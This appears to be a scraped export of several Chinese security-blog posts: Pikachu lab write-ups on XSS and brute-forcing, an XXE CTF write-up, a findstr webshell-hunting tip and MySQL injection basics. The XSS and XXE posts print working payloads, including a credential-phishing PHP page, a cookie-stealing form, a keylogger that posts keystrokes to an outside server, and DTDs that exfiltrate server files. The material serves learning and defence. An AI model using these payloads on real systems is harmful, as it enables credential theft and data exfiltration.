//在当前目录及所有子目录的所有.php后缀文件中搜索字符串，只打印文件名。 配合FOR使用: 12345678FOR /R %i IN (*) DO @echo %i &gt;&gt; filelist.txt &amp;&amp; findstr /IM /F:filelist.txt \"echo\"// FOR语句会遍历当前目录下的所有文件并保存到filelist.txt// findstr会使用'echo'字符串到filelist.txt文件中的所有文件去查找，若文件中有'echo'就打印文件名。FOR /R D:\\WWW\\ %i IN (*) DO @echo %i &gt;&gt; filelist.txt &amp;&amp; findstr /IM /F:filelist.txt /G:strlist.txt//strlist.txt是包含许多一句话木马字符串的文件，就可以用来简单排查后门。 用于管道符之后进行结果筛选： 12netstat -ano | findstr /i est //筛选出所有ESTABLISHED状态的链接。netstat -ano | find \"PID\" //找到指定进程号的连接。","categories":[{"name":"Misc","slug":"Misc","permalink":"https://sakuxa.com/categories/Misc/"}],"tags":[{"name":"Winodows","slug":"Winodows","permalink":"https://sakuxa.com/tags/Winodows/"}]},{"title":"WEB漏洞靶场Pikachu Writeup Chapter 2：XSS","slug":"WEB漏洞靶场pikachu-xss","date":"2019-03-21T01:10:05.000Z","updated":"2019-05-21T03:24:04.371Z","comments":true,"path":"2019/03/21/WEB漏洞靶场pikachu-xss/","link":"","permalink":"https://sakuxa.com/2019/03/21/WEB漏洞靶场pikachu-xss/","excerpt":"XSS可以分为如下几种常见类型： 反射性XSS 存储型XSS DOM型XSS","text":"XSS可以分为如下几种常见类型： 反射性XSS 存储型XSS DOM型XSS 一、前面的话0x00 XSS漏洞的防范 一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入; 输出转义：根据输出点的位置对输出到前端的内容进行适当转义; 0x01 XSS过滤的简单绕过 前端过滤绕过，抓包拦截改包即可。 大小写绕过：&lt;SciPt&gt;alert(1)&lt;/sCIpt&gt;（JavaScript大小写敏感，但HTML大小写不敏感） 双写绕过：&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt; 注释干扰：&lt;scri&lt;!-- comment--&gt;pt&gt;alert(1)&lt;/sc&lt;!-- comment --&gt;ript&gt; 编码绕过：注意前端编码解码机制。 不同类型的XSS利用方式都差不多，目标是让其执行JS代码，因此在下面的例子中每个点只用一种漏洞利用方式。 二、XSS0x00 反射型XSS（GET）漏洞挖掘 打开页面，是一个输入框。 随意输入内容，点击submit。可以发现我们输入的内容会被以GET的形式提交到服务器，并且会被放到响应页面中返回。 直接尝试最简单的测试Payload：&lt;script&gt;alert(/xss/)&lt;/script&gt;（输入框有长度限制，直接在URL里输入）。我们输入的数据被当作JS代码执行，成功弹窗。 漏洞利用(钓鱼攻击) 简单的重定向钓鱼： 只需要将Payload改为：&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;。 http://www.evil.com为要重定向到的地址，即钓鱼页面。 接着诱导用户点击我们插入了Payload的链接，页面就会重定向到指定的钓鱼页面。 Basic验证钓鱼： 让用户访问我们插入了Payload的链接后，链接中的JS会被执行，执行结果就是请求fish.php，该文件会返回一个basic验证框。输入用户名密码后，会被发到我们的服务器。 Payload：&lt;script src=http://localhost/fish.php&gt;&lt;/script&gt; fish.php内容： 1234567891011121314151617&lt;?phperror_reporting(0);// var_dump($_SERVER);if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) &#123;//发送认证框，并给出迷惑性的info header('Content-type:text/html;charset=utf-8'); header(\"WWW-Authenticate: Basic realm='认证'\"); header('HTTP/1.0 401 Unauthorized'); echo 'Authorization Required.'; exit;&#125; else if ((isset($_SERVER['PHP_AUTH_USER'])) &amp;&amp; (isset($_SERVER['PHP_AUTH_PW'])))&#123;//将结果发送给搜集信息的后台,请将这里的IP地址修改为我们服务器的IP header(\"Location: http://192.168.100.126/pkxss/xfish/xfish.php?username=&#123;$_SERVER[PHP_AUTH_USER]&#125; &amp;password=&#123;$_SERVER[PHP_AUTH_PW]&#125;\");&#125;?&gt; 诱导用户点击链接：192.168.100.126/pikachu/vul/xss/xss_reflected_get.php?message=&lt;script src=http://localhost/fish.php&gt;&lt;/script&gt;&amp;submit=submit，弹出验证框： 输入用户名密码点击确定后，我们服务器的访问日志中发现用户名密码： 漏洞分析 用户在URL中提交的message参数的值会被服务器获取，然后未经任何过滤就拼接到字符串$html中。 接着会在返回给用户的页面中直接输出打印$html变量。 0x01 反射型XSS（POST）漏洞挖掘 打开页面，是一个登录页面，经过测试登录框不存在XSS，那么先进行登录，登录进去后会有一个输入框。 在输入框中输入&lt;script&gt;alert(/xss/)&lt;/script&gt;进行测试。成功弹窗。 漏洞利用（窃取Cookie） 该漏洞类型属于POST型反射XSS，因为数据是通过POST方式提交的。 POST方式提交数据导致我们不能像GET方式那样，在URL中插入Payload诱导用户点击即可完成攻击。 POST型反射XSS漏洞利用（窃取Cookie）思路： 实际上是CSRF配合XSS。 在自己的服务器编写一个HTML文件，当访问该文件时，里面的JS会执行，执行效果是会自动提交POST数据。 诱导用户点击我们编写的HTML文件的URL。 123456789101112131415161718&lt;html&gt;&lt;head&gt; &lt;script&gt; window.onload = function() &#123; document.getElementById(\"postsubmit\").click(); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;form method=\"post\" action=\"http://192.168.100.26/pikachu/vul/xss/xsspost/xss_reflected_post.php\"&gt; &lt;input id=\"xssr_in\" type=\"text\" name=\"message\" value= \"&lt;script&gt; document.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie; &lt;/script&gt;\" /&gt; &lt;input id=\"postsubmit\" type=\"submit\" name=\"submit\" value=\"submit\" /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 查看服务器访问日志，发现Cookie被发回： 漏洞分析 与GET方式的差别在于提交数据的方式不一样而已，其他都是一样的。 0x02 存储型XSS漏洞挖掘 打开页面，是一个留言的功能页面，随意输入然后提交，留言内容会被存储到数据库，然后输出到页面上。 输入&lt;script&gt;alert(/xss/)&lt;/scipt&gt;并提交，JS被成功执行并弹窗。 漏洞利用（键盘记录） JS Payload文件： 该JS文件作用是监听键盘记录，并将键盘记录通过AJAX请求发送到我们的服务器。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455function createAjax()&#123; var request=false; if(window.XMLHttpRequest)&#123; request=new XMLHttpRequest(); if(request.overrideMimeType)&#123; request.overrideMimeType(\"text/xml\"); &#125; &#125;else if(window.ActiveXObject)&#123; var versions=['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP']; for(var i=0; i&lt;versions.length; i++)&#123; try&#123; request=new ActiveXObject(versions[i]); if(request)&#123; return request; &#125; &#125;catch(e)&#123; request=false; &#125; &#125; &#125; return request;&#125;var ajax=null;var xl=\"datax=\";function onkeypress() &#123; var realkey = String.fromCharCode(event.keyCode); xl+=realkey; show();&#125;document.onkeypress = onkeypress;function show() &#123; ajax = createAjax(); ajax.onreadystatechange = function () &#123; if (ajax.readyState == 4) &#123; if (ajax.status == 200) &#123; var data = ajax.responseText; &#125; else &#123; alert(\"页面请求失败\"); &#125; &#125; &#125; var postdate = xl; ajax.open(\"POST\", \"http://192.168.1.15/rserver.php\",true); ajax.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); ajax.setRequestHeader(\"Content-length\", postdate.length); ajax.setRequestHeader(\"Connection\", \"close\"); ajax.send(postdate);&#125; rserver.php是我们服务器上用于接收键盘记录的页面。这里不能再使用任意URL然后看访问日志的方式。因为AJAX请求默认是受同源策略影响的，不能跨域进行请求。解决跨域请求的一个方法是，要请求的目标服务器在响应消息的头部中使用Access-Control-Allow-Origin:xxx.com来允许某些域可以发起跨域请求。 由于我们的目的就是要让它跨域发起请求发到我们的服务器上，所以我们用于接收键盘记录的页面编写为： 1234567891011&lt;?php//设置允许被任意域跨域访问header(\"Access-Control-Allow-Origin:*\");$data = $_POST['datax'];//保存到数据库.......?&gt; 在留言处输入Payload&lt;script src=http://192.168.100.126/evil.js&gt;&lt;/script&gt;。之后在网页上按下的键都会被记录并发送到我们的接收页面。 漏洞分析 用户的留言提交到服务器后，服务器只进行了防SQLi的转义就直接保存到数据库中。访问留言页面时，会从数据库中把留言记录查询出来直接输出打印在页面中。 0x03 DOM XSS(输入框)漏洞挖掘 打开页面，有一个输入框，点击Click me，会出现一个&lt;a&gt;标签，猜测应该是JS操作DOM添加了一个标签。 查看页面源代码，找到对应的JS，可以发现我们在输入框输入的数据会被直接拼接在&lt;a&gt;标签，然后将新创建的&lt;a&gt;标签直接插入HTML中： 我们只要考虑闭合就可以随意插入JS代码。 在输入框输入：#&#39; onmouseover=&quot;alert(/xss/)&quot;&gt;，鼠标移动到&lt;a&gt;标签上，成功弹窗。 该漏洞比较鸡肋。 0x04 DOM XSS（URL）漏洞挖掘 打开页面后，操作与上一节一样，直接查看源代码，找到对应的JS。 由JS代码可知我们可以在URL中的text参数构造payload，然后点击页面的&lt;a&gt;标签，我们的payload就会被插入到HTML中。 构造text参数的值为：&#39; onclick=&quot;alert(/xss/)&quot;&gt; 先点击有些事费尽心思....... 再点击就让往事都随风...... 漏洞利用 该漏洞相对于上一节的DOM XSS漏洞要有危害得多，因为诱导用户点击链接就能完成攻击。 漏洞利用参照前面几节，都是差不多的。 0x05 XSS盲打XSS盲打是指输入的数据不确定会被输出到哪个页面，只能尝试性使用Payload。 XSS Blind 本质上也是存储型的XSS。 漏洞挖掘 打开页面，有输入框需要输入数据。输入的数据会被提交到服务器中，但是我们并不能确定我们输入的数据会被输出在哪个页面。 输入简单的payload测试：&lt;script&gt;alert(/xss/)&lt;/script&gt; 在本例中，我们输入的数据会被保存到数据库，然后输出在管理员后台页面中，当我们插入xss的payload，管理员登录后台管理时就会被攻击，危害相当大。 漏洞分析 我们输入的数据未经过任何过滤处理就会被直接保存在服务器中。 后台页面会从数据库中读取数据，输出到页面。 0x06 简单XSS过滤绕过漏洞挖掘 打开页面，有一个输入框，输入一个XSS探针Payload来检测是否做了过滤，对什么做了过滤，XSS探针： &quot;&#39;&lt;script javascript onload src&gt;&lt;a href&gt;&lt;/a&gt;#$%^ 输入探针后点击提交，然后查看页面源代码，确定过滤，发现&lt;、script、javascript直接被过滤了。但是其他并没有被过滤。 使用&lt;a&gt;标签、&lt;img&gt;标签就可以绕过过滤。使用Payload：&lt;img src=x onerror=alert(1)&gt;，成功弹窗。 漏洞分析 采用了正则进行过滤，我们除了可以使用&lt;a&gt;、&lt;img&gt;登其他标签之外，还可以使用大写的script标签绕过。 0x07 XSS htmlspecialchars()过滤绕过漏洞挖掘 打开页面时一个登录框，继续同上一节的操作，插入XSS探针然后查看页面源代码，可以看到一些特殊字符被实体编码了： 但可以注意到单引号并没有被转义，因此可以使用Payload：&#39; onmouseover=alert(1) &#39; 漏洞分析 分析源代码可知，后端使用htmlspecialchars()函数对用户的提交的数据进行了转义： 但是存在一个问题，htmlspecialchars()函数默认是不对单引号进行转义的，要想连单引号一起转义，需要给函数传入参数ENT_QUOTES。 htmlspecialchars()函数把预定义的字符转换为 HTML实体。 预定义的字符是： 123456&gt; &amp; 转为 `&amp;amp;` &gt; &quot; 转为 `&amp;quot;`&gt; &apos; 转为 `&amp;#039;` &gt; &lt; 转为 `&amp;lt;` &gt; &gt; 转为 `&amp;gt;`&gt; 可用的引号类型： 1234&gt; ENT_COMPAT - 默认。仅编码双引号。 &gt; ENT_QUOTES - 编码双引号和单引号。 &gt; ENT_NOQUOTES - 不编码任何引号。&gt; 漏洞修复 使用htmlspecialchars($GET[&#39;message&#39;],ENT_QUOTES),而不是htmlspecialchars($GET[&#39;message&#39;])。 0x08 XSS href输出漏洞挖掘 打开页面继续使用XSS探针进行测试，可以发现特殊字符都被转义了，包括单引号。猜测使用了htmlspecialchars($GET[&#39;message&#39;],ENT_QUOTES)对提交的数据进行转义。 但是，可以发现，我们输入的内容会被输出到&lt;a&gt;标签的href属性中。因此我们可以使用伪协议javascript进行绕过。 输入Payload：javascript:alert(1),点击超链接，成功弹窗。 漏洞分析 后台确实对提交的数据进行了转义，但却没考虑到href属性可以使用伪协议执行JS。 漏洞修复 对输入的数据进行过滤，只允许http/https。 对输出的数据进行转义，使用htmlspecialchars($GET[&#39;message&#39;],ENT_QUOTES)。 0x09 XSS之输出到JS漏洞挖掘 在页面输入内容，我们可以发现输入的数据会被输出在页面的JS代码之中，例如我们输入whatever： 那么，我们只需要考虑闭合，即可构造XSS，输入Payload：&#39;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;，成功弹窗。 漏洞分析 漏洞修复 这里有一个问题，由于输出点是&lt;script&gt;标签中，而在该标签中的内容HTML解析器是不会进行解码的，因此不能使用htmlspecialchars()函数进行转义，否则JS代码将会因为无法被解码而无法正常执行。具体原理参考文章：XSS学习系列Chapter 1：浏览器解析HTML文档 所以解决方案应该是：在JS的输出点应该使用\\对特殊字符进行转义。 三、总结 XSS漏洞会出现的点是复杂的、多种多样的。 XSS漏洞的本质是用户提交的数据被当作JS代码执行，因此挖掘XSS漏洞就是要想方设法让输入的数据被执行。 XSS漏洞的防范总体可以概括为“对输入进行过滤”和“对输出进行转义”，但是针对不同地方、不同功能点的防范方式及要考虑的方面也是不尽相同的。如0x08与0x09小节就是很好的例子。","categories":[{"name":"Pikachu","slug":"Pikachu","permalink":"https://sakuxa.com/categories/Pikachu/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://sakuxa.com/tags/XSS/"},{"name":"靶场","slug":"靶场","permalink":"https://sakuxa.com/tags/靶场/"},{"name":"WEB安全","slug":"WEB安全","permalink":"https://sakuxa.com/tags/WEB安全/"}]},{"title":"WEB漏洞靶场Pikachu Writeup Chapter 1：表单暴力破解","slug":"WEB漏洞靶场pikachu—writeup","date":"2019-03-19T01:03:38.000Z","updated":"2019-05-21T03:19:42.661Z","comments":true,"path":"2019/03/19/WEB漏洞靶场pikachu—writeup/","link":"","permalink":"https://sakuxa.com/2019/03/19/WEB漏洞靶场pikachu—writeup/","excerpt":"无意间发现了pikachu这个WEB漏洞靶场，发现靶场涉及到的漏洞类型蛮多的，练练手挺合适的。 看到靶场介绍里有一句话： “如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它”。","text":"无意间发现了pikachu这个WEB漏洞靶场，发现靶场涉及到的漏洞类型蛮多的，练练手挺合适的。 看到靶场介绍里有一句话： “如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它”。 一、前面的话0x00 Whatever在使用该靶场时，会包含如下方面： 漏洞挖掘：找出漏洞或证明漏洞。 漏洞分析：分析源代码。 漏洞利用。 漏洞修复。 0x01 靶机介绍Pikachu源码：https://github.com/zhuifengshaonianhanlu/pikachu Pikachu是一个带有漏洞的Web应用系统，包含了常见的web安全漏洞。 包含： Burt Force(暴力破解漏洞) XSS(跨站脚本漏洞) CSRF(跨站请求伪造) SQL-Inject(SQL注入漏洞) RCE(远程命令/代码执行) Files Inclusion(文件包含漏洞) Unsafe file downloads(不安全的文件下载) Unsafe file uploads(不安全的文件上传) Over Permisson(越权漏洞) ../../../(目录遍历) I can see your ABC(敏感信息泄露) PHP反序列化漏洞 XXE(XML External Entity attack) 不安全的URL重定向 SSRF(Server-Side Request Forgery) 管理工具 More…(找找看?..有彩蛋!) 二、暴力破解0x00 简单表单爆破漏洞挖掘 打开页面，是一个登录表单页面。 输入admin/admin作为用户名/密码，点击Login，并使用burp进行抓包拦截。 在burp右键抓到的数据包，然后Send to Intruder。或者直接Ctrl + I发送到intuder爆破模块。 转到intruder模块，在Positions按钮下，先点击右侧的Clear $清除变量，然后选中用户名和密码位置点击ADD $将用户名和密码位置作为变量。Attack type就使用Cluster bomb模式。 点击Positions按钮旁边的Payloads按钮进入设置Payload，由于我们设置了两个变量，所以需要设置两个Payload。 选择Payload set为1，Payload Type使用默认的Simple list，然后点击Load导入用户名字典文件。 选择Payload set为2，Payload Type使用默认的Simple list，然后点击Load导入密码字典文件。 设置好之后，点击右上角Start Attack。 在爆破时，点击Length字段进行排序，可发现有不同大小的数据包，点击查看数据包发现爆破成功。密码：admin/123456 0x01 服务器端验证码绕过漏洞挖掘 打开页面，还是一个登录表单页面，但是增加了验证码。 接下来尝试绕过验证码。 首先先确定，验证码是服务器生成的，还是客户端JS生成的。 在网页上按下F12按钮，定位验证码图片，图片由&lt;img&gt;标签加载，可以确定验证码由服务器生成。 确定了验证码是由服务器生成了之后，再确定服务器是否真的对验证码做了验证。 输入用户名密码及验证码然后点击Login，并使用Burp进行抓包。 右击抓到的数据包，选择Send to Repeater发送到重放模块。或者直接Ctrl + R。 点击进入Repeater模块，将验证码修改为任意值后，点击Go按钮进行重放。发现返回验证码输入错误，证明服务器对验证码做了验证。 接下来，将验证码设置为正确的值，然后发送数据包，发现验证码验证成功。然后再继续重放该正确验证码的数据包几次，发现即使由于用户名密码不正确，导致页面刷新了验证码，但是并不需要再次输入验证码。即服务器只验证了一次验证码，验证成功的验证码可以一直重复使用。 我们只需要验证正确一次验证码，就可以一直使用该验证码，然后就可以进行爆破了。爆破的流程同上一节，不再赘述。 漏洞分析： 接下来，让我们来分析一下源码，看漏洞是如何产生的（只截取部分关键代码）： 通过源码分析，我们可以得知，我们提交的验证码会被与存储在服务器session中的验证码做验证，但是由于在验证完成后，没有及时的销毁session，导致存储在session中的验证码在session生存周期内可以一直被重复使用。 漏洞修复： 在验证完成之后，销毁验证码session：unset($_SESSION[&#39;vcode&#39;]); 另， 通过分析验证码生成的源码，还发现了一个问题，生成的验证码会被以明文方式作为Cookie返回给客户端。这会导致直接可以进行爆破，爆破方法参照下面0x03节的内容。 0x02 客户端验证码绕过漏洞挖掘 打开页面，是一个包含验证码的表单登录页面。 还是先确定验证码是由JS生成还是由服务器生成。 继续在页面F12,然后定位找到元素，可以确定是由客户端JS的createCode()函数生成。 输入用户名密码及验证码，点击Login并使用Burp抓包。将验证码删除并进行重放，发现没有影响。可以确定服务器并未对验证码进行验证。接下来直接进行爆破即可，爆破流程参考前面。 漏洞分析 前端JS生成验证码且前端JS进行验证码的校验，对使用Burp抓包爆破而言形同虚设。 0x03 Token防爆破首先，先给出结论，表单token的作用是防止重复提交和CSRF。但不要认为有防止重复提交在防爆破上就有作用。 因为表单Token是作为一个隐藏的&lt;input /&gt;标签的值输出在返回给用户的页面的，是可以直接从页面读取获取的，所以是防不了爆破的。如果还有疑问，继续往下看使用Burp进行爆破。 还是继续登录并抓包的操作，可以发现POST提交的数据中存在Token，第一次放行数据包，返回用户名密码不存在。接着再连续重放该数据包，发现只是刷新的页面，返回消息没有再报用户名密码不存在。因此可以猜测到，服务器对Token做了验证，由于Token不正确所以没有进行用户名密码验证的逻辑，所以仅刷新了页面。 接下来使用Burp进行爆破，先将数据包发送到Intruder模块。 将用户名、密码、Token作为变量，Attack Type使用Pitch fork模式。（注意，只能使用该模式） 转到Options按钮下，找到Grep-Extract，勾选Extract the following items from response，然后点击ADD。 点击ADD后会弹出一个框，按下图步骤方式配置，配置完成点击OK。作用就是可以从响应消息（Response）中提取一段数据作为下一次请求信息（Request）的Payload。 接着转到Payloads按钮下设置Payload 选择Payload set为1，Payload Type使用默认的Simple list，然后点击Load导入用户名字典文件。 选择Payload set为2，Payload Type使用默认的Simple list，然后点击Load导入密码字典文件。 选择Payload set为3，Payload Type选择Recursive grep，然后输入第一个请求要使用的Payload(可以不设)。 设置完成后，点击Start attack，发现报错。这是因为不能使用多线程爆破，因为每次爆破其中一个Payload需要从前一个响应消息中提取。因此再次转到Options按钮下，找到Request Engine，修改线程数为单线程。 再次点击Start attack，进行爆破即可。 点击Length按钮进行排序，发现一个长度与其他不一致的数据包，点击数据包查看，爆破成功。 漏洞分析 查看源码发现服务器端在进行用户名密码验证的逻辑之前，先验证了token。印证了我们之前的猜想。 但是使用Token进行防爆破的漏洞不在于是否对Token进行了验证，而在于Token会返回在页面中被读取。 三、总结 防暴力破解应该理解成防止自动化脚本快速请求以达到破解的目的。 表单暴力破解防范： 使用安全的验证码进行验证（滑动验证码…）。 在某段单位时间内，用户登录失败达到一定次数时，锁定用户或限制短时间内不允许登录。 对IP进行单位时间内登录请求数的限制。 验证码应该以图片形式而不是以字符串形式出现在HTML或Cookie中。 参考链接： https://www.cnblogs.com/KbCat/p/9317545.html","categories":[{"name":"Pikachu","slug":"Pikachu","permalink":"https://sakuxa.com/categories/Pikachu/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://sakuxa.com/tags/靶场/"},{"name":"WEB安全","slug":"WEB安全","permalink":"https://sakuxa.com/tags/WEB安全/"},{"name":"暴力破解","slug":"暴力破解","permalink":"https://sakuxa.com/tags/暴力破解/"}]},{"title":"记一次面试某安全公司一道XXE漏洞CTF面试题","slug":"记一次面试某安全公司一道XXE漏洞CTF面试题","date":"2019-03-15T07:54:09.000Z","updated":"2019-05-21T03:45:59.342Z","comments":true,"path":"2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/","link":"","permalink":"https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/","excerpt":"最近面试一家安全公司，拿到一套CTF题目作为面试前的技术能力测试。其中有一道XEE漏洞的题目，碰巧最近正在研究学习XXE漏洞，过程中遇到了一些坑，隧做个记录。","text":"最近面试一家安全公司，拿到一套CTF题目作为面试前的技术能力测试。其中有一道XEE漏洞的题目，碰巧最近正在研究学习XXE漏洞，过程中遇到了一些坑，隧做个记录。 正文1.起步首先，点击题目链接进入，发现是一个RSS checker的页面，页面有一个输入框要求输入URL地址，直接随意输入一个地址，点击提交查询。 提交后返回XML文档无效“XML document is not valid”的信息，由此可以知道此处应该是需要我们提供一个XML文档的URL地址。既然是XML文档，那么首先考虑到的存在XEE漏洞。 2.漏洞验证接下来就是要验证是否存在XXE漏洞，确定漏洞存在的根本是要证明目标服务器允许外部实体。所以证明的整体思路为： 1.让目标服务器访问请求我们提供的XML文档。 2.我们提供的XML文档中使用了外部实体。 3.若我们的XML文档中的外部实体被解析了，则证明漏洞存在。 首先，要让目标服务器请求我们的XML文档的话，我们得先有一台外网服务器，话不多说，直接去搞一个腾讯云学生服务器。 搞定了服务器后，直接在服务器上创建一个XML文档，命名为evil.xml，内容如下： 12345&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % test SYSTEM &quot;http://148.x.x.141/xxe_test&quot;&gt;%test;]&gt; 接着为了让目标服务器可以获取我们的evil.xml，我们需要一个HTTP服务器。直接使用Python建立一个简单的WEB服务，输入命令：python -m SimpleHTTPServer 80。这样我们的服务器就会开启一个监听在80端口的HTTP服务。 再接下来就是要让目标服务器请求我们的evil.xml了，在网页输入我们evil.xml的URL然后点击提交查询，然后观察我们服务器上HTTP服务的访问情况。 在上图中，可以看到目标服务器向我们的服务器发起了两次请求，第一次请求evil.xml文档。第二次请求了/xxe_test，这正是我们在evil.xml中定义的引用外部实体。简单说就是我们在网页上输入我们的evil.xml的URL地址，目标服务器不但请求了我们的evil.xml文档，还解析执行了evil.xml的内容。evil.xml中&lt;!ENTITY % test SYSTEM &quot;http://148.x.x.141/xxe_test&quot;&gt;就是外部实体，若允许外部实体，这条语句就会执行，执行的结果就是向http://148.x.x.141/xxe_test(即我们的服务器)发起请求。我们在服务器上看到该请求，也就证明目标服务器允许外部实体，也即存在XXE漏洞。 3.漏洞利用确定了漏洞的存在，接下来就是利用漏洞搞事。XXE最常见的利用方式就是进行任意文件读取。获取敏感重要文件的内容。 读取文件之前我们需要确定以什么方式读取：直接回显还是带外通道。 直接回显即目标服务器会把结果直接放于响应页面中返回。观察响应页面就只有XML文档有效或无效的信息。显然我们只能采取带外通道读取的方式。读取文件的大概思路如下： 1.确定要读取的文件，如/etc/passwd。 2.再创建一个文件，文件内容是定义实体，具体内容见下面。 3.修改evil.xml的内容，并将上一步创建的文件引用进来，具体内容见下面。 首先，我们先尝试读取目标服务器的/etc/passwd文件。evil.xml文件内容为： 123456&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM &quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://148.70.34.141/data.dtd&quot;&gt;%dtd; %payload; %send;]&gt; 第3行作用是读取/etc/passwd文件内容，并使用php filter将内容进行压缩及Base64编码。 第4行引用了另一个文件，文件名为data.dtd，文件的内容如下： 1&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://148.70.34.141/?data=%file;&apos;&gt;&quot;&gt; 该文件定义了一个实体，实体的内容又定义了另一个实体，内层实体的作用是将第三行压缩打包的内容作为HTTP请求参数发送到我们的HTTP服务器上。 &amp;#37;是%的实体，内层的实体的%必须要使用实体形式，否则是不能解析的。 之所以还需要创建该文件，而不能将该文件内容直接定义在evil.xml中，是因为直接在evil.xml中定义是不生效的，不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。 大概梳理一下两个文件的实体解析过程： %dtd;会执行evil.xml的第3行，执行的结果是引用了data.dtd文件，可以简单认为将data.dtd的文件内容替换%dtd;。 %payload;执行的就是data.dtd的内容，可简单认为，%payload;会被&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://148.70.34.141/?data=%file;&#39;&gt;进行替换。 %send;会向http://148.70.34.141/?data=%file;发起请求，而发起请求前，%file;也会被解析，被压缩加密的/etc/passwd文件内容进行替换。 编写好Payload文件之后，继续之前的操作，让目标服务器请求我们的evil.xml文件。 并没有成功读取/etc/passwd，而是报错了，根据错误信息我们可以知道，目标服务器对允许读取的路径进行了权限控制，只允许读取的路径为：/challenge/web-serveur/ch29。 那么我们只能读取其他文件了，根据错误信息我们还可以知道，被允许读取的路径下，存在一个index.php文件，尝试读取该文件，只需要的evil.xml文件中的/etc/passwd改为./index.php（允许使用相对路径）即可。 修改好evil.xml文件后，继续让目标服务器请求。发现被压缩加密的index.php文件内容被成功发送到我们的服务器。 接下来就是将压缩编码内容进行解压解码。此处可以编写一个接收的页面进行解压解码。由于环境原因，我的操作是将压缩编码的文件内容复制保存到一个文件中，文件名tmp.txt。然后创建一个php文件，内容为： 123&lt;?php echo file_get_contents(\"php://filter/read=convert.base64-decode/zlib.inflate/resource=tmp.txt\");?&gt; 将该php文件放到phpstudy的web根目录下并访问，就可以在页面中找到flag。 0x03 总结做下来之后，题目的难度不算高，但是期间遇到了一个坑，感觉payload什么的都设置的没有问题了，但是一直读取不了文件，为此花了很长时间，最终查了一下资料才知道，使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错。 刚开始使用的是：php://filter/read=convert.base64-decode/resource=，只对文件内容进行编码，所以文件过大无法发送。后面使用：php://filter/read=convert.base64-decode/zlib.inflate/resource=进行压缩编码才成功读取。 压缩及编码：echo file_get_contents(&quot;php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&quot;);解压及解码：echo file_get_contents(&quot;php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1&quot;); 参考链接： https://xz.aliyun.com/t/3357","categories":[{"name":"Misc","slug":"Misc","permalink":"https://sakuxa.com/categories/Misc/"}],"tags":[{"name":"XXE","slug":"XXE","permalink":"https://sakuxa.com/tags/XXE/"},{"name":"CTF","slug":"CTF","permalink":"https://sakuxa.com/tags/CTF/"}]},{"title":"SQL注入系列Chapter 1：MySQL基础知识","slug":"0x00-SQL注入系列之Mysql基础知识","date":"2019-03-12T02:14:38.000Z","updated":"2019-05-21T03:52:40.775Z","comments":true,"path":"2019/03/12/0x00-SQL注入系列之Mysql基础知识/","link":"","permalink":"https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/","excerpt":"这边文章记录在进行SQL注入时，需要具备的部分MySQL基础知识。","text":"这边文章记录在进行SQL注入时，需要具备的部分MySQL基础知识。 一、MySQLi常用函数0x00 系统函数 @@version_compile_os：操作系统版本 @basedir：MySQL安装路径 version()：MySQL版本 user()：当前数据库用户 @@datadir：数据库路径 database()：当前所处数据库名 0x01 字符串拼接函数 Concat() Concat_WS() GROUP_CONCAT() 在MySQLi中，拼接函数的作用在于将多行数据合并为一行，因为在注入中有时候能显示的行数是有限的。 1.Concat(str1,str2,…) 返回结果为拼接参数得到的字符串。 如有任何一个参数为NULL,则返回值为NULL。可以有一个或多个参数。 select concat(user,&quot;,&quot;,password) from mysql.user; 2.Concat_WS(separator,str1,str2,…) separator为拼接字符串之间的分隔符。 3.GROUP_CONCAT() 将DBMS中所有数据库名作为一列返回： select group_concat(schema_name) from information_schema.schemata; 将指定数据库的所有表名作为一列返回： select group_concat(table_name) from information_schema.tables where table_schema=&#39;db_name&#39;; 将指定数据表的所有列名作为一列返回： select group_concat(column_name) from information_schema.columns where table_name=&#39;tb_name&#39;; 0x02 字符/数字函数 ASCII(): 返回字符对应的ASCII码值。 ORD()：返回字符对应的ASCII码值。 CHAR()：返回数字对应的ASCII字符。 BIN(): 返回数字对应的二进制串。 CONV(Num,from_base,to_base): 数字进制转换。 HEX():十六进制编码 UNHEX()：十六进制解码 FLOOR()：向下取整 RAND()：用于产生一个0~1的随机数 LOWER()：转成小写字母 UPPER(): 转成大写字母 0x03 字符串切片函数 MID(string，start，count)：从字符串下标为start处开始切取count个字符（下标从1开始）。 SUBSTR()：同上。 SUBSTRING()：同上。 LEFT(string, n)：获取从字符串左边开始的指定n个字符。 